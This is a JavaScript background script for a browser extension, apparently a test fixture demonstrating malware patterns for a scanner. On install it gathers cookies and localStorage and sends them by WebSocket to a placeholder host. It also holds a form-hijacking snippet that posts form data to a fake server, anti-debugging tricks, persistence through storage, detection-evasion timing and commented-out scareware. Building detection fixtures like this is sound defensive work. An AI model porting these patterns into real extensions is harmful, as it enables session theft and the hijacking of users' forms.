// TEST EXTENSION: Advanced malware patterns demonstration

console.log('TEST: Advanced malware extension background loaded');

// Pattern 1: Cryptocurrency mining simulation
function startCryptoMining() {
  console.log('TEST: Starting cryptocurrency mining simulation');
  
  // Simulate crypto mining with WebAssembly and workers
  if (typeof WebAssembly !== 'undefined') {
    console.log('TEST: WebAssembly available for mining');
  }
  
  // Simulate mining with crypto.getRandomValues
  const miningData = new Uint8Array(32);
  crypto.getRandomValues(miningData);
  console.log('TEST: Mining data generated:', miningData);
  
  // Simulate worker-based mining
  setInterval(() => {
    console.log('TEST: Mining cycle completed');
    // Simulate sending mining results
    fetch('https://mining-pool.suspicious/result', {
      method: 'POST',
      body: JSON.stringify({ hash: miningData })
    }).catch(() => {
      console.log('TEST: Mining result transmission failed (expected)');
    });
  }, 5000);
}

// Pattern 2: Anti-debugging techniques
function setupAntiDebugging() {
  console.log('TEST: Setting up anti-debugging techniques');
  
  // Debugger statement
  debugger;
  
  // Console clearing
  console.clear();
  
  // Environment detection
  if (typeof window.chrome !== 'undefined') {
    console.log('TEST: Chrome environment detected');
  }
  
  if (navigator.webdriver) {
    console.log('TEST: WebDriver detected - potential automation');
  }
  
  // Stealth timing
  setTimeout(() => {
    console.log('TEST: Delayed stealth operation');
  }, Math.random() * 10000 + 5000); // Random delay 5-15 seconds
}

// Pattern 3: Form hijacking
function setupFormHijacking() {
  console.log('TEST: Setting up form hijacking');
  
  // This would normally be in content script, but demonstrating the pattern
  const formHijackingCode = `
    document.addEventListener('submit', function(event) {
      console.log('TEST: Form submission intercepted');
      const formData = new FormData(event.target);
      // Simulate sending form data to malicious server
      fetch('https://data-stealer.malicious/forms', {
        method: 'POST',
        body: formData
      });
    });
  `;
  
  console.log('TEST: Form hijacking code prepared');
}

// Pattern 4: Social engineering
function setupSocialEngineering() {
  console.log('TEST: Setting up social engineering');
  
  // Simulate alert-based social engineering
  setTimeout(() => {
    console.log('TEST: Would show alert: "Your computer is infected! Click OK to clean it."');
    // alert('Your computer is infected! Click OK to clean it.');
  }, 10000);
  
  // Simulate popup abuse
  setTimeout(() => {
    console.log('TEST: Would open malicious popup');
    // window.open('https://fake-antivirus.malicious/clean', '_blank');
  }, 15000);
}

// Pattern 5: Data exfiltration
function setupDataExfiltration() {
  console.log('TEST: Setting up data exfiltration');
  
  // Simulate XMLHttpRequest for data theft
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://exfiltrator.bad/data');
  xhr.setRequestHeader('Content-Type', 'application/json');
  
  const stolenData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    timestamp: Date.now()
  };
  
  console.log('TEST: Data prepared for exfiltration:', stolenData);
  
  // Simulate WebSocket for real-time data theft
  try {
    const ws = new WebSocket('wss://realtime-stealer.malicious/stream');
    ws.onopen = () => {
      console.log('TEST: WebSocket connection established for data streaming');
      ws.send(JSON.stringify(stolenData));
    };
  } catch (e) {
    console.log('TEST: WebSocket connection failed (expected)');
  }
}

// Pattern 6: Persistence mechanisms
function setupPersistence() {
  console.log('TEST: Setting up persistence mechanisms');
  
  // Store malicious configuration
  localStorage.setItem('malware_config', JSON.stringify({
    active: true,
    version: '1.0.0',
    lastCheck: Date.now()
  }));
  
  sessionStorage.setItem('temp_data', 'sensitive_information');
  
  // Chrome storage API abuse
  chrome.storage.local.set({
    malware_state: {
      installed: true,
      hidden: true,
      persistence: 'enabled'
    }
  });
}

// Pattern 7: Network evasion
function setupNetworkEvasion() {
  console.log('TEST: Setting up network evasion');
  
  // Random delays to avoid detection
  const randomDelay = Math.random() * 5000 + 1000;
  setTimeout(() => {
    console.log('TEST: Evasive network request');
    fetch('https://evasion-server.suspicious/ping', {
      method: 'GET',
      headers: {
        'User-Agent': navigator.userAgent,
        'X-Random': Math.random().toString()
      }
    }).catch(() => {
      console.log('TEST: Evasive request failed (expected)');
    });
  }, randomDelay);
}

// Initialize all malware patterns
chrome.runtime.onInstalled.addListener(() => {
  console.log('TEST: Advanced malware extension installed');
  
  startCryptoMining();
  setupAntiDebugging();
  setupFormHijacking();
  setupSocialEngineering();
  setupDataExfiltration();
  setupPersistence();
  setupNetworkEvasion();
  
  console.log('TEST: All malware patterns initialized');
});
